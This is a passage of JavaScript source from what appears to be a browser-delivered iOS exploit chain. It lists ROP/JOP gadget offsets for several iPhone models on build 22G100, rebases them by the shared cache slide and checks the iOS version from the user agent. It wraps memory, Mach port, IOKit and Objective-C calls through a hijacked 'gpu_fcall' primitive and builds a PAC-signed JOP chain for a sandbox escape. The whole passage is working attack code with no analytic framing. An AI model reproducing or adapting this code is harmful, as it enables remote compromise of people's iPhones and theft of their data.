      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone16,1_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone16,2_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,1_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,2_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,3_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c925ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2616f598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   }

};


    let offsets_sbx1 = sbx1_offsets[device_model];
    transformSurface_gadget = offsets_sbx1.transformSurface_gadget + shared_cache_slide;
    dyld_signPointer_gadget = offsets_sbx1.dyld_signPointer_gadget + shared_cache_slide;
    malloc_restore_0_gadget = offsets_sbx1.malloc_restore_0_gadget + shared_cache_slide;
    malloc_restore_1_gadget = offsets_sbx1.malloc_restore_1_gadget + shared_cache_slide;
    malloc_restore_2_gadget = offsets_sbx1.malloc_restore_2_gadget + shared_cache_slide;
    malloc_restore_3_gadget = offsets_sbx1.malloc_restore_3_gadget + shared_cache_slide;
    if (offsets_sbx1.set_x19_gadget != undefined) {
      set_x19_gadget = offsets_sbx1.set_x19_gadget + shared_cache_slide;
      set_x30_gadget = offsets_sbx1.set_x30_gadget + shared_cache_slide;
      load_x0_0x0_gadget = offsets_sbx1.load_x0_0x0_gadget + shared_cache_slide;
      load_x0_0x0_gadget_data = offsets_sbx1.load_x0_0x0_gadget_data + shared_cache_slide;
      new_save_x0_gadget = offsets_sbx1.new_save_x0_gadget + shared_cache_slide;
      new_save_x0_gadget_data = offsets_sbx1.new_save_x0_gadget_data + shared_cache_slide;
      isNAN_lr_gadget = offsets_sbx1.isNAN_lr_gadget + shared_cache_slide;
      mov_x8_x0_gadget = offsets_sbx1.mov_x8_x0_gadget + shared_cache_slide;
      leak_surface_address_gadget = offsets_sbx1.leak_surface_address_gadget + shared_cache_slide;
      mov_x0_x8_gadget = offsets_sbx1.mov_x0_x8_gadget + shared_cache_slide;
      save_sp_gadget = offsets_sbx1.save_sp_gadget + shared_cache_slide;
      save_x0_gadget = offsets_sbx1.save_x0_gadget + shared_cache_slide;
      save_x0_gadget_data = offsets_sbx1.save_x0_gadget_data + shared_cache_slide;
      mov_x20_x19_gadget = offsets_sbx1.mov_x20_x19_gadget + shared_cache_slide;
      restore_sp_gadget = offsets_sbx1.restore_sp_gadget + shared_cache_slide;
      xpac_gadget = offsets_sbx1.xpac_gadget + shared_cache_slide;
      restore_sp_gadget_data = offsets_sbx1.restore_sp_gadget_data + shared_cache_slide;
      load_x1_0x30_gadget = offsets_sbx1.load_x1_0x30_gadget + shared_cache_slide;
      load_x1_0x30_gadget_data = offsets_sbx1.load_x1_0x30_gadget_data + shared_cache_slide;
      load_x0_0x18_gadget = offsets_sbx1.load_x0_0x18_gadget + shared_cache_slide;
      load_x0_0x18_gadget_data = offsets_sbx1.load_x0_0x18_gadget_data + shared_cache_slide;
      dyld_objc_patching_gadget = offsets_sbx1.dyld_objc_patching_gadget + shared_cache_slide;
      dyld_patching_noprolog_gadget = offsets_sbx1.dyld_patching_noprolog_gadget + shared_cache_slide;
      set_sp_gadget = offsets_sbx1.set_sp_gadget + shared_cache_slide;
      read_surface_address_gadget = offsets_sbx1.read_surface_address_gadget + shared_cache_slide;
      dyld_patching_dispatcher_gadget = offsets_sbx1.dyld_patching_dispatcher_gadget + shared_cache_slide;
      braaz_x8_gadget = offsets_sbx1.braaz_x8_gadget + shared_cache_slide;
    }
    if (offsets_sbx1.tcall_CRLG != undefined) {
      tcall_CRLG = offsets_sbx1.tcall_CRLG + shared_cache_slide;
      tcall_X0LG = offsets_sbx1.tcall_X0LG + shared_cache_slide;
      tcall_RLG = offsets_sbx1.tcall_RLG + shared_cache_slide;
      tcall_CSSG = offsets_sbx1.tcall_CSSG + shared_cache_slide;
      tcall_DSSG = offsets_sbx1.tcall_DSSG + shared_cache_slide;
      tcall_DG = offsets_sbx1.tcall_DG + shared_cache_slide;
      _CFObjectCopyProperty = offsets_sbx1._CFObjectCopyProperty + shared_cache_slide;
      load_x1x3x8 = offsets_sbx1.load_x1x3x8 + shared_cache_slide;
      fcall_14_args_write_x8 = offsets_sbx1.fcall_14_args_write_x8 + shared_cache_slide;
      _4_fcalls = offsets_sbx1._4_fcalls + shared_cache_slide;
      self_loop = offsets_sbx1.self_loop + shared_cache_slide;
      jsvm_isNAN_fcall_gadget = offsets_sbx1.jsvm_isNAN_fcall_gadget + shared_cache_slide;
      jsvm_isNAN_fcall_gadget2 = offsets_sbx1.jsvm_isNAN_fcall_gadget2 + shared_cache_slide;
      store_x0_x0 = offsets_sbx1.store_x0_x0 + shared_cache_slide;
      str_x1_x2 = offsets_sbx1.str_x1_x2 + shared_cache_slide;
      mov_x0_x22 = offsets_sbx1.mov_x0_x22 + shared_cache_slide;
      add_x22_0x90 = offsets_sbx1.add_x22_0x90 + shared_cache_slide;
      xpac_gadget = offsets_sbx1.xpac_gadget + shared_cache_slide;
    }
    if (save_x0_gadget == 0n || save_x0_gadget == shared_cache_slide) {
      save_x0_gadget = new_save_x0_gadget;
      save_x0_gadget_data = new_save_x0_gadget_data;
    }
  } else {}
  const ios_version = function () {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) {
      version = version.split('_').map(part => parseInt(part));
      return parseInt(version.join('')).toString(16);
    }
  }();
  function get_ios_version() {
    return ios_version;
  }
  function assert(a, b = "N/A") {
    if (!a) {
      throw new Error(`assert failed: ${b}`);
    }
  }
  function ERROR(a) {
    throw new Error(a);
  }
  function calloc(...args) {
    return gpu_fcall(CALLOC, ...args);
  }
  function realloc(...args) {
    return gpu_fcall(REALLOC, ...args);
  }
  function free(...args) {
    return gpu_fcall(FREE, ...args);
  }
  function confstr(...args) {
    return gpu_fcall(CONFSTR, ...args);
  }
  function access(...args) {
    return gpu_fcall(ACCESS, ...args);
  }
  function mkdir(...args) {
    return gpu_fcall(MKDIR, ...args);
  }
  function strlcat(...args) {
    return gpu_fcall(STRLCAT, ...args);
  }
  function strdup(...args) {
    return gpu_fcall(STRDUP, ...args);
  }
  function strlen(...args) {
    return gpu_fcall(STRLEN, ...args);
  }
  function open(...args) {
    return gpu_fcall(OPEN, ...args);
  }
  function close(...args) {
    return gpu_fcall(CLOSE, ...args);
  }
  function remove(...args) {
    return gpu_fcall(REMOVE, ...args);
  }
  function sync(...args) {
    return gpu_fcall(SYNC, ...args);
  }
  function write(...args) {
    return gpu_fcall(WRITE, ...args);
  }
  function pwrite(...args) {
    return gpu_fcall(PWRITE, ...args);
  }
  function pread(...args) {
    return gpu_fcall(PREAD, ...args);
  }
  function writev(...args) {
    return gpu_fcall(WRITEV, ...args);
  }
  function lseek(...args) {
    return gpu_fcall(LSEEK, ...args);
  }
  function memcpy(...args) {
    return gpu_fcall(MEMCPY, ...args);
  }
  function memset(...args) {
    return gpu_fcall(MEMSET, ...args);
  }
  function memmem(...args) {
    return gpu_fcall(MEMMEM, ...args);
  }
  function usleep(...args) {
    return gpu_fcall(USLEEP, ...args);
  }
  function exit(...args) {
    return gpu_fcall(EXIT, ...args);
  }
  function mach_vm_copy(...args) {
    return gpu_fcall(MACH_VM_COPY, ...args);
  }
  function mach_vm_allocate(...args) {
    return gpu_fcall(MACH_VM_ALLOCATE, ...args);
  }
  function mach_vm_deallocate(...args) {
    return gpu_fcall(MACH_VM_DEALLOCATE, ...args);
  }
  function mach_vm_read(...args) {
    return gpu_fcall(MACH_VM_READ, ...args);
  }
  function mach_vm_map(...args) {
    return gpu_fcall(MACH_VM_MAP, ...args);
  }
  function mach_vm_remap(...args) {
    return gpu_fcall(MACH_VM_REMAP, ...args);
  }
  function mach_make_memory_entry_64(...args) {
    return gpu_fcall(MACH_MAKE_MEMORY_ENTRY_64, ...args);
  }
  function mmap(...args) {
    return gpu_fcall(MMAP, ...args);
  }
  function munmap(...args) {
    return gpu_fcall(MUNMAP, ...args);
  }
  function msync(...args) {
    return gpu_fcall(MSYNC, ...args);
  }
  function mprotect(...args) {
    return gpu_fcall(MPROTECT, ...args);
  }
  function mach_absolute_time(...args) {
    return gpu_fcall(MACH_ABSOLUTE_TIME, ...args);
  }
  function mach_timebase_info(...args) {
    return gpu_fcall(MACH_TIMEBASE_INFO, ...args);
  }
  function bootstrap_look_up(...args) {
    return gpu_fcall(BOOTSTRAP_LOOK_UP, ...args);
  }
  function mach_port_allocate(...args) {
    return gpu_fcall(MACH_PORT_ALLOCATE, ...args);
  }
  function mach_port_mod_refs(...args) {
    return gpu_fcall(MACH_PORT_MOD_REFS, ...args);
  }
  function mach_port_deallocate(...args) {
    return gpu_fcall(MACH_PORT_DEALLOCATE, ...args);
  }
  function mach_port_destroy(...args) {
    return gpu_fcall(MACH_PORT_DESTROY, ...args);
  }
  function mach_port_insert_right(...args) {
    return gpu_fcall(MACH_PORT_INSERT_RIGHT, ...args);
  }
  function mach_msg(...args) {
    return gpu_fcall(MACH_MSG, ...args);
  }
  function mach_msg_send(...args) {
    return gpu_fcall(MACH_MSG_SEND, ...args);
  }
  function pthread_self(...args) {
    return gpu_fcall(PTHREAD_SELF, ...args);
  }
  function pthread_create(...args) {
    return gpu_fcall(PTHREAD_CREATE, ...args);
  }
  function pthread_create_suspended_np(...args) {
    return gpu_fcall(PTHREAD_CREATE_SUSPENDED_NP, ...args);
  }
  function pthread_attr_init(...args) {
    return gpu_fcall(PTHREAD_ATTR_INIT, ...args);
  }
  function pthread_attr_setstacksize(...args) {
    return gpu_fcall(PTHREAD_ATTR_SETSTACKSIZE, ...args);
  }
  function pthread_attr_setstackaddr(...args) {
    return gpu_fcall(PTHREAD_ATTR_SETSTACKADDR, ...args);
  }
  function pthread_mach_thread_np(...args) {
    return gpu_fcall(PTHREAD_MACH_THREAD_NP, ...args);
  }
  function pthread_join(...args) {
    return gpu_fcall(PTHREAD_JOIN, ...args);
  }
  function pthread_yield_np(...args) {
    return gpu_fcall(PTHREAD_YIELD_NP, ...args);
  }
  function thread_suspend(...args) {
    return gpu_fcall(THREAD_SUSPEND, ...args);
  }
  function thread_resume(...args) {
    return gpu_fcall(THREAD_RESUME, ...args);
  }
  function thread_terminate(...args) {
    return gpu_fcall(THREAD_TERMINATE, ...args);
  }
  function pthread_mutex_lock(...args) {
    return gpu_fcall(PTHREAD_MUTEX_LOCK, ...args);
  }
  function pthread_mutex_unlock(...args) {
    return gpu_fcall(PTHREAD_MUTEX_UNLOCK, ...args);
  }
  function ulock_wait(...args) {
    return gpu_fcall(ULOCK_WAIT, ...args);
  }
  function ulock_wake(...args) {
    return gpu_fcall(ULOCK_WAKE, ...args);
  }
  function sysctlbyname(...args) {
    return gpu_fcall(SYSCTLBYNAME, ...args);
  }
  function IOServiceMatching(...args) {
    return gpu_fcall(IOSERVICEMATCHING, ...args);
  }
  function IOServiceGetMatchingService(...args) {
    return gpu_fcall(IOSERVICEGETMATCHINGSERVICE, ...args);
  }
  function IOServiceOpen(...args) {
    return gpu_fcall(IOSERVICEOPEN, ...args);
  }
  function IOServiceClose(...args) {
    return gpu_fcall(IOSERVICECLOSE, ...args);
  }
  function IOConnectCallStructMethod(...args) {
    return gpu_fcall(IOCONNECTCALLSTRUCTMETHOD, ...args);
  }
  function pthread_mutex_init(...args) {
    return gpu_fcall(PTHREAD_MUTEX_INIT, ...args);
  }
  function kIOMainPortDefault() {
    return uread32(func_resolve("kIOMainPortDefault"));
  }
  function lazy_fcall(fname, ...args) {
    let fptr = func_resolve(fname);
    assert(fptr != 0n, `failed to lookup ${fname}`);
    return gpu_fcall(fptr, ...args);
  }
  function mach_task_self() {
    return 0x203n;
  }
  function sel_registerName(cstr) {
    return gpu_fcall(SEL_REGISTERNAME, cstr);
  }
  function objc_getClass(class_name) {
    return gpu_fcall(OBJC_GETCLASS, get_cstring(class_name));
  }
  function objc_alloc(class_obj) {
    return gpu_fcall(OBJC_ALLOC, class_obj);
  }
  function objc_alloc_init(class_obj) {
    return gpu_fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function objc_msgSend(...args) {
    return gpu_fcall(OBJC_MSGSEND, ...args);
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
    return gpu_fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFDictionaryCreateMutable(allocator, capacity, keyCallBacks, valueCallBacks) {
    return gpu_fcall(CFDICTIONARYCREATEMUTABLE, allocator, capacity, keyCallBacks, valueCallBacks);
  }
  function CFDictionarySetValue(dict, key, value) {
    return gpu_fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return gpu_fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfaceCreate(dict) {
    return gpu_fcall(IOSURFACECREATE, dict);
  }
  function IOSurfaceGetBaseAddress(surface) {
    return gpu_fcall(IOSURFACEGETBASEADDRESS, surface);
  }
  function IOSurfacePrefetchPages(...args) {
    return gpu_fcall(IOSURFACEPREFETCHPAGES, ...args);
  }
  function IOSurfaceGetID(...args) {
    return gpu_fcall(IOSURFACEGETID, ...args);
  }
  function CFRelease(obj) {
    return gpu_fcall(CFRELEASE, obj);
  }
  function CFShow(obj) {
    return gpu_fcall(CFSHOW, obj);
  }
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
  }
  function object_release(obj) {
    return objc_msgSend(obj, selector_release);
  }
  function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
  }
  function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
  }
  function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
  }
  function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
  }
  function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
  }
  function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
  }
  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  let PAGE_SIZE = 0x4000n;
  let NULL = 0n;
  let MACH_PORT_NULL = 0n;
  let F_OK = 0n;
  let NSEC_PER_USEC = 1000n;
  let NSEC_PER_MSEC = 1000000n;
  let KERN_SUCCESS = 0n;
  let KERN_INVALID_ARGUMENT = 4n;
  let SEEK_SET = 0x0n;
  let O_RDWR = 0x2n;
  let O_CREAT = 0x200n;
  let MS_INVALIDATE = 0x2n;
  let MS_KILLPAGES = 0x4n;
  let MS_DEACTIVATE = 0x8n;
  let MS_SYNC = 0x10n;
  let PROT_NONE = 0n;
  let PROT_READ = 0x1n;
  let PROT_WRITE = 0x2n;
  let VM_PROT_DEFAULT = 0x3n;
  const MAP_MEM_VM_SHARE = 0x400000n;
  let MAP_SHARED = 0x1n;
  let MAP_PRIVATE = 0x2n;
  let MAP_ANON = 0x1000n;
  let VM_FLAGS_FIXED = 0x0n;
  let VM_FLAGS_ANYWHERE = 0x1n;
  let VM_FLAGS_RANDOM_ADDR = 0x8n;
  let VM_FLAGS_OVERWRITE = 0x4000n;
  let VM_INHERIT_NONE = 2n;
  let _CS_DARWIN_USER_TEMP_DIR = 65537n;
  let MAXPATHLEN = 1024n;
  let UL_COMPARE_AND_WAIT = 1n;
  let ULF_WAKE_ALL = 0x100n;
  function uread_bitsize(where, bs) {
    let mask = (0x1n << bs) - 0x1n;
    return uread64(where) & mask;
  }
  function uread32(where) {
    return uread_bitsize(where, 32n);
  }
  function uwrite_bitsize(where, what, bs) {
    let mask = (0x1n << bs) - 0x1n;
    let new_what = uread64(where) & ~mask | what & mask;
    uwrite64(where, new_what);
  }
  let UINT64_BITSIZE = 0x8n * 0x8n;
  let UINT32_BITSIZE = 0x8n * 0x4n;
  let UINT16_BITSIZE = 0x8n * 0x2n;
  let UINT8_BITSIZE = 0x8n * 0x1n;
  function struct_field_set(struct, buf, field, val) {
    let bit_size = struct[field][0];
    let offset = struct[field][1];
    uwrite_bitsize(buf + offset, val, bit_size);
  }
  function struct_field_get(struct, buf, field) {
    let bit_size = struct[field][0];
    let offset = struct[field][1];
    return uread_bitsize(buf + offset, bit_size);
  }
  function get_field_addr(struct, buf, field) {
    return buf + struct[field][1];
  }
  function trunc_page(x) {
    return x & 0xffffffffffffc000n;
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function setup_fcall_jopchain() {
    let save_sp_args = calloc(1n, PAGE_SIZE);
    let set_sp_stack_ptr = new_uint64_t();
    mach_vm_allocate(mach_task_self(), set_sp_stack_ptr, PAGE_SIZE * 0x20n, VM_FLAGS_ANYWHERE);
    let new_thread_set_sp_stack = uread64(set_sp_stack_ptr);
    new_thread_set_sp_stack += PAGE_SIZE * 0x10n;
    uwrite64(save_sp_args + 0x0n, new_thread_set_sp_stack);
    uwrite64(save_sp_args + 0x8n, pacia(set_sp_gadget, 0x720fn));
    uwrite64(save_sp_args + 0x10n, pacia(set_all_registers_gadget, 0n));
    let new_thread_dyld_patching_args = calloc(1n, PAGE_SIZE);
    uwrite64(new_thread_dyld_patching_args + 0x108n, save_sp_args);
    uwrite64(new_thread_dyld_patching_args + 0x110n, 1n);
    uwrite64(new_thread_dyld_patching_args + 0x2a0n, pacia(save_sp_gadget, 0n));
    return {
      "save_sp_args": save_sp_args,
      "set_sp_stack": new_thread_set_sp_stack,
      "dyld_patching_args": new_thread_dyld_patching_args
    };
  }
  function setup_dyld_patching_fcall(pc, x0, x1, x2, x3) {
    let args = calloc(1n, 0x100n);
    uwrite64(args + 0x00n, x0);
    uwrite64(args + 0x08n, x1);
    uwrite64(args + 0x10n, x2);
    uwrite64(args + 0x18n, x3);
    let dyld_patching_args = calloc(1n, PAGE_SIZE);
    LOG(`dyld_patching_args: ${dyld_patching_args.hex()}`);
    uwrite64(dyld_patching_args + 0x8n, dyld_patching_args);
    uwrite64(dyld_patching_args + 0x108n, args);
    uwrite64(dyld_patching_args + 0x110n, 0n);
    uwrite64(dyld_patching_args + 0x2a0n, pacia(xpac(pc), 0n));
    return dyld_patching_args;
  }
  let PTHREAD_SELF = func_resolve("pthread_self");
  let SYSLOG = func_resolve("syslog");
  let PUTS = func_resolve("puts");
  let DLOPEN = func_resolve("dlopen");
  let PTHREAD_GETSPECIFIC = func_resolve("pthread_getspecific");
  let CALLOC = func_resolve("calloc");
  let REALLOC = func_resolve("realloc");
  let FREE = func_resolve("free");
  let CONFSTR = func_resolve("confstr");
  let ACCESS = func_resolve("access");
  let MKDIR = func_resolve("mkdir");
  let STRLCAT = func_resolve("strlcat");
  let STRDUP = func_resolve("strdup");
  let STRLEN = func_resolve("strlen");
  let OPEN = func_resolve("open");
  let CLOSE = func_resolve("close");
  let REMOVE = func_resolve("remove");
  let SYNC = func_resolve("sync");
  let WRITE = func_resolve("write");
  let PWRITE = func_resolve("pwrite");
  let PREAD = func_resolve("pread");
  let WRITEV = func_resolve("writev");
  let LSEEK = func_resolve("lseek");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");
  let MEMMEM = func_resolve("memmem");
  let USLEEP = func_resolve("usleep");
  let EXIT = func_resolve("exit");
  let MACH_VM_COPY = func_resolve("mach_vm_copy");
  let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
  let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
  let MACH_VM_READ = func_resolve("mach_vm_read");
  let MACH_VM_MAP = func_resolve("mach_vm_map");
  let MACH_VM_REMAP = func_resolve("mach_vm_remap");
  let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
  let MMAP = func_resolve("mmap");
  let MUNMAP = func_resolve("munmap");
  let MSYNC = func_resolve("msync");
  let MPROTECT = func_resolve("mprotect");
  let MACH_ABSOLUTE_TIME = func_resolve("mach_absolute_time");
  let MACH_TIMEBASE_INFO = func_resolve("mach_timebase_info");
  let BOOTSTRAP_LOOK_UP = func_resolve("bootstrap_look_up");
  let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
  let MACH_PORT_MOD_REFS = func_resolve("mach_port_mod_refs");
  let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
  let MACH_PORT_DESTROY = func_resolve("mach_port_destroy");
  let MACH_PORT_INSERT_RIGHT = func_resolve("mach_port_insert_right");
  let MACH_MSG = func_resolve("mach_msg");
  let MACH_MSG_SEND = func_resolve("mach_msg_send");
  let PTHREAD_CREATE = func_resolve("pthread_create");
  let PTHREAD_CREATE_SUSPENDED_NP = func_resolve("pthread_create_suspended_np");
  let PTHREAD_ATTR_INIT = func_resolve("pthread_attr_init");
  let PTHREAD_ATTR_SETSTACKSIZE = func_resolve("pthread_attr_setstacksize");
